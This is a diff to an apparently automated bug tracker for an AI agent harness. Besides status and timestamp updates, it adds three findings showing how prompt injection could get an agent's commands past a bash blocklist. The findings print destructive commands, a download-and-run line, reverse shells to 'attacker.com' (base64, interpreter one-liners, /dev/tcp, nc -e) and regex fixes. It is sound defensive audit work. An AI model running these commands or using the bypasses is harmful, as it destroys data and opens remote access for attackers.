@@ -13,15 +13,15 @@
 | **Last Fixer Pass** | `2026-03-20T10:16:26Z` |
 | **Last Validator Pass** | `2026-03-20T04:07:00Z` |
 | **Last Digest Run** | `2026-03-20T19:48:00Z` |
-| **Last Security Scan** | `2026-03-23T02:55:00Z` |
+| **Last Security Scan** | `2026-03-20T20:00:15Z` |
 | **Hunter Loop Interval** | `5min` |
 | **Fixer Loop Interval** | `2min` |
 | **Validator Loop Interval** | `5min` |
-| **Last TestGen Run** | `2026-03-20T23:30:00Z` |
-| **Last Git Manager Pass** | `2026-03-20T23:00:00Z` (Cycle 189) |
+| **Last TestGen Run** | `2026-03-20T23:45:00Z` |
+| **Last Git Manager Pass** | `2026-03-20T23:30:00Z` (Cycle 190) |
 | **Last Supervisor Pass** | `2026-03-21T03:30:00Z` |
-| **Total Found** | `296` |
-| **Total Pending** | `6` |
+| **Total Found** | `299` |
+| **Total Pending** | `9` |
 | **Total In Progress** | `0` |
 | **Total Fixed** | `32` |
 | **Total In Validation** | `0` |
@@ -189,7 +189,7 @@ pending → in-progress → fixed → in-validation → verified → archived to
 
 
 ### BUG-0191
-- **status:** `blocked`
+- **status:** `verified`
 - **severity:** `low`
 - **file:** `src/config/types.ts`
 - **line:** `76`
@@ -271,7 +271,7 @@ pending → in-progress → fixed → in-validation → verified → archived to
 
 
 ### BUG-0235
-- **status:** `blocked`
+- **status:** `verified`
 - **severity:** `high`
 - **file:** `src/errors.ts`
 - **line:** `44`
@@ -291,7 +291,7 @@ pending → in-progress → fixed → in-validation → verified → archived to
 ---
 
 ### BUG-0236
-- **status:** `blocked`
+- **status:** `verified`
 - **severity:** `high`
 - **file:** `src/checkpointers/redis.ts`
 - **line:** `52`
@@ -315,7 +315,7 @@ pending → in-progress → fixed → in-validation → verified → archived to
 
 
 ### BUG-0244
-- **status:** `blocked`
+- **status:** `verified`
 - **severity:** `medium`
 - **file:** `src/cli/build.ts`
 - **line:** `41`
@@ -357,7 +357,7 @@ pending → in-progress → fixed → in-validation → verified → archived to
 ---
 
 ### BUG-0246
-- **status:** `blocked`
+- **status:** `verified`
 - **severity:** `high`
 - **file:** `src/guardrails/budget.ts`
 - **line:** `51`
@@ -398,7 +398,7 @@ pending → in-progress → fixed → in-validation → verified → archived to
 ---
 
 ### BUG-0250
-- **status:** `blocked`
+- **status:** `verified`
 - **severity:** `medium`
 - **file:** `src/harness/loop/inference.ts`
 - **line:** `156`
@@ -460,7 +460,7 @@ pending → in-progress → fixed → in-validation → verified → archived to
 ---
 
 ### BUG-0253
-- **status:** `blocked`
+- **status:** `verified`
 - **severity:** `medium`
 - **file:** `src/swarm/self-improvement/experiment-log.ts`
 - **line:** `57`
@@ -582,7 +582,7 @@ pending → in-progress → fixed → in-validation → verified → archived to
 ---
 
 ### BUG-0259
-- **status:** `blocked`
+- **status:** `verified`
 - **severity:** `medium`
 - **file:** `src/harness/memory/ranker.ts`
 - **line:** `41`
@@ -602,7 +602,7 @@ pending → in-progress → fixed → in-validation → verified → archived to
 ---
 
 ### BUG-0260
-- **status:** `blocked`
+- **status:** `verified`
 - **severity:** `medium`
 - **file:** `src/harness/memory/ranker.ts`
 - **line:** `94`
@@ -622,7 +622,7 @@ pending → in-progress → fixed → in-validation → verified → archived to
 ---
 
 ### BUG-0262
-- **status:** `blocked`
+- **status:** `verified`
 - **severity:** `medium`
 - **file:** `packages/tools/src/web-search/brave.ts`
 - **line:** `45`
@@ -746,7 +746,7 @@ pending → in-progress → fixed → in-validation → verified → archived to
 ---
 
 ### BUG-0268
-- **status:** `blocked`
+- **status:** `verified`
 - **severity:** `medium`
 - **file:** `src/harness/loop/index.ts`
 - **line:** `55`
@@ -892,7 +892,7 @@ pending → in-progress → fixed → in-validation → verified → archived to
 ---
 
 ### BUG-0275
-- **status:** `blocked`
+- **status:** `verified`
 - **severity:** `high`
 - **file:** `src/models/openrouter.ts`
 - **line:** `472`
@@ -934,7 +934,7 @@ pending → in-progress → fixed → in-validation → verified → archived to
 ---
 
 ### BUG-0277
-- **status:** `blocked`
+- **status:** `verified`
 - **severity:** `high`
 - **file:** `src/swarm/pool.ts`
 - **line:** `209`
@@ -954,7 +954,7 @@ pending → in-progress → fixed → in-validation → verified → archived to
 ---
 
 ### BUG-0278
-- **status:** `blocked`
+- **status:** `verified`
 - **severity:** `high`
 - **file:** `src/checkpointers/redis.ts`
 - **line:** `180`
@@ -1127,7 +1127,7 @@ pending → in-progress → fixed → in-validation → verified → archived to
 ---
 
 ### BUG-0286
-- **status:** `blocked`
+- **status:** `verified`
 - **severity:** `medium`
 - **file:** `src/models/google.ts`
 - **line:** `383`
@@ -1248,6 +1248,66 @@ pending → in-progress → fixed → in-validation → verified → archived to
 - **fixer_started:** `2026-03-20T09:40:21Z`
 - **fixer_completed:** `2026-03-20T09:40:46Z`
 - **fix_summary:** `Updated test to expect 3 messages instead of 2. Added assertions for truncated third item. All 14 tests pass, tsc clean.`
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0296
+- **status:** `pending`
+- **severity:** `high`
+- **file:** `src/harness/hooks-engine.ts`
+- **line:** `343`
+- **category:** `security-injection`
+- **description:** The `dangerousBashPatterns` blocklist is bypassed by base64-encoding a dangerous payload and piping the decoded output to a shell interpreter (e.g. `echo "cm0gLXJmIC8=" | base64 -d | bash`).
+- **context:** The blocklist matches plaintext patterns like `curl|sh`, `mkfs`, `chmod 777`, etc. An attacker (via prompt injection) can encode any blocked command in base64, then decode and execute it — the encoded form matches none of the existing regex patterns. This is a universal bypass: `echo "<base64>" | base64 -d | sh` or `base64 -d <<< "<payload>" | bash` evades every pattern in the list. The fix should add patterns for `base64.*\|.*sh`, `base64.*\|.*bash`, and the heredoc variant. OWASP A03:2021 - Injection.
+- **reopen_count:** `0`
+- **branch:** ``
+- **hunter_found:** `2026-03-20T20:00:15Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** ``
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0297
+- **status:** `pending`
+- **severity:** `high`
+- **file:** `src/harness/hooks-engine.ts`
+- **line:** `343`
+- **category:** `security-injection`
+- **description:** The `dangerousBashPatterns` blocklist can be bypassed by using scripting language interpreters (`python3 -c`, `perl -e`, `ruby -e`, `node -e`) to execute dangerous system commands that would otherwise be blocked.
+- **context:** The blocklist only matches shell-native dangerous patterns (rm, mkfs, dd, curl|sh, etc.). A prompt-injected LLM payload such as `python3 -c "import os; os.system('rm -rf /')"` or `perl -e 'system("curl attacker.com|sh")'` executes arbitrary commands through an interpreter — the actual dangerous operation is inside a string literal invisible to the regex patterns. Since Python, Perl, Ruby, and Node are commonly available on developer machines, this is a practical bypass. Fix: add patterns for `python[23]?\s+-c`, `perl\s+-e`, `ruby\s+-e`, and `node\s+-e` with dangerous subcommands, or block interpreter `-c`/`-e` flags entirely when combined with system/exec calls. OWASP A03:2021 - Injection.
+- **reopen_count:** `0`
+- **branch:** ``
+- **hunter_found:** `2026-03-20T20:00:15Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** ``
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0298
+- **status:** `pending`
+- **severity:** `high`
+- **file:** `src/harness/hooks-engine.ts`
+- **line:** `343`
+- **category:** `security-injection`
+- **description:** The `dangerousBashPatterns` blocklist has no patterns for reverse shell payloads (`bash -i >& /dev/tcp/host/port 0>&1`, `nc -e /bin/sh host port`) which allow an attacker to establish interactive remote access.
+- **context:** A prompt-injected LLM could execute `bash -i >& /dev/tcp/attacker.com/4444 0>&1` or `nc -e /bin/sh attacker.com 4444` to open a reverse shell to an attacker-controlled server. Neither `/dev/tcp` redirection patterns nor netcat (`nc`) with `-e` flag are covered by any existing blocklist pattern. This is distinct from the download-and-execute patterns in BUG-0289 — reverse shells provide interactive access without downloading a payload. Fix: add patterns for `/dev/tcp/`, `nc\s+.*-e`, `ncat\s+.*-e`, and `socat.*exec` to the blocklist. OWASP A03:2021 - Injection.
+- **reopen_count:** `0`
+- **branch:** ``
+- **hunter_found:** `2026-03-20T20:00:15Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** ``
 - **validator_started:** ``
 - **validator_completed:** ``
 - **validator_notes:** ``
